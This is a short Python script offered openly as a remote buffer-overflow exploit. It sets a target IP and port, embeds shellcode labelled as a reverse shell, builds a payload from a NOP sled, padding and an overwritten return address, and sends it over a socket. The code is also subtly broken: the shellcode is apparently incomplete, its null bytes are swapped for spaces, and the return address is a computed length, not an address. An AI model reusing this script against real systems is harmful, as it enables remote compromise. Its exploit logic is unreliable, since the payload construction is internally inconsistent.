import socket, struct, sys

#Cambia esto, no seas huev√≥n
target_ip = "192.168.1.100"
target_port = 12345

buffer_size = 1024
eip_offset = 4

bad_chars = "\x0a\x0d"

# Simple reverse shell by 1nfvck
shellcode = b""
shellcode += b"\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b"
shellcode += b"\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01"
shellcode += b"\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81"
shellcode += b"\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75"
shellcode += b"\xe2\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4a\x8b\x72\x1c\x01\xde\x8b"
shellcode += b"\x14\x8b\x01\xeb\x96\x96\x9a\x68\x58\xa4\x74\x61\xff\xd3"

shellcode = shellcode.replace(b"\x00", b" ")

shellcode += b"\x00" * (len(bad_chars) + eip_offset)

padding = b"A" * (buffer_size - len(shellcode) - len(bad_chars) - eip_offset)

nop_sled = b"\x90" * 100

exploit = b""
exploit += nop_sled
exploit += padding
exploit += struct.pack("I", (eip_offset + len(padding)) & 0xFFFFFFFF)
exploit += shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.send(exploit)
s.close()
